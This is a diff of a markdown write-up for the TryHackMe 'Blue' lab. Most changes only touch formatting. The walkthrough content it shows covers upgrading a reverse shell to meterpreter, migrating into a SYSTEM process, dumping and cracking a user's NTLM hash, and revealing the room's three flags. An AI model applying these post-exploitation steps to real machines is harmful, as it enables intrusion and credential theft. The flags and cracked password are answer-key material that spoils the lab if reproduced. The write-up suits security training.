@@ -1,12 +1,12 @@
 # Blue
 
-![tryhackme.com - © TryHackMe](.gitbook/assets/tryhackme-logo-small.png)
+![tryhackme.com - © TryHackMe](<../../learn/.gitbook/assets/tryhackme-logo-small (2).png>)
 
 > 🔬🌐 [Blue](https://tryhackme.com/room/blue)
 >
-> *Deploy & hack into a Windows machine, leveraging common misconfigurations issues.*
+> _Deploy & hack into a Windows machine, leveraging common misconfigurations issues._
 >
-> ![](.gitbook/assets/blue.jpg)
+> <img src=".gitbook/assets/blue.jpg" alt="" data-size="original">
 
 🎯 Target IP: `10.10.177.175`
 
@@ -40,7 +40,7 @@ background # or CTRL+Z
 
 ## Privilege Escalation
 
-- Used payload was `windows/x64/shell/reverse_tcp`, so convert the shell to a `meterpreter` shell.
+* Used payload was `windows/x64/shell/reverse_tcp`, so convert the shell to a `meterpreter` shell.
 
 ```bash
 search shell_to_meterpreter
@@ -59,7 +59,7 @@ getuid
 ps
 ```
 
-- My process may not run as `SYSTEM` user. Select a `PID` (process ID) with the `NT AUTHORITY\SYSTEM` user, and migrate my process to that one. `e.g. ` 1284 - spoolsv.exe
+* My process may not run as `SYSTEM` user. Select a `PID` (process ID) with the `NT AUTHORITY\SYSTEM` user, and migrate my process to that one. `e.g.` 1284 - spoolsv.exe
 
 ```bash
 migrate 1284
@@ -81,7 +81,7 @@ Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
 <Username>:<User ID>:<LM hash>:<NT hash>:<Comment>:<Home Dir>:
 ```
 
-`aad3b435b51404eeaad3b435b51404ee` is the LM hash for ***no password***.
+`aad3b435b51404eeaad3b435b51404ee` is the LM hash for _**no password**_.
 
 ```bash
 echo 'ffb43f0de35be4d9917ac0cc8ad57f8d' > jonhash.txt
@@ -97,7 +97,7 @@ Jon's credentials are `jon`:`alqfna22`.
 
 ## Flags
 
-- In the `meterpreter` session
+* In the `meterpreter` session
 
 ```bash
 cd C:\\
@@ -106,17 +106,14 @@ cat flag1.txt
 ```
 
 <details>
+
 <summary>Reveal Flag1: 🚩</summary>
-
-
 
 `flag{access_the_machine}`
 
-![](.gitbook/assets/image-20230316143237356.png)
+<img src=".gitbook/assets/image-20230316143237356.png" alt="" data-size="original">
 
 </details>
-
-
 
 ```bash
 cd C:/Windows/System32/config
@@ -124,17 +121,14 @@ cat flag2.txt
 ```
 
 <details>
+
 <summary>Reveal Flag2: 🚩</summary>
-
-
 
 `flag{sam_database_elevated_access}`
 
-![](.gitbook/assets/image-20230316143502259.png)
+<img src=".gitbook/assets/image-20230316143502259.png" alt="" data-size="original">
 
 </details>
-
-
 
 ```bash
 cd C:\\Users\\
@@ -145,15 +139,13 @@ cat flag3.txt
 ```
 
 <details>
+
 <summary>Reveal Flag3: 🚩</summary>
-
-
 
 `flag{admin_documents_can_be_valuable}`
 
-![](.gitbook/assets/image-20230316143807868.png)
+<img src=".gitbook/assets/image-20230316143807868.png" alt="" data-size="original">
 
 </details>
 
-------
-
+***
